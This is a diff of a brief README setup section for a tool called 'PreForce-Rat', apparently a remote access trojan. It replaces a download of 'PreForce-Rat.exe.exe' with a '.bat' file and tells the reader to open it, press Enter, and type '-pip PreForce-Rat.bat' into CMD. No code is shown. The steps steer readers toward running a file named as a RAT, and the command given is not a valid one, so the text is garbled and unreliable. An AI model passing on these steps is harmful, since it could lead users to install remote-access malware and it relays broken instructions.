@@ -1,13 +1,12 @@
 # Set Up
 
-Download <<PreForce-Rat.exe.exe>>
- if doesn't work download <<PreForce-RatIT.exe>>
+Download <<PreForce-Rat.bat>>
 
-Open it And Click "Done".
+Open it And Press "Enter".
 
 Open CMD.
 
-Type << -pip PreForce-Rat.exe >>
+Type << -pip PreForce-Rat.bat >>
 
 It will Pop up ! 
 
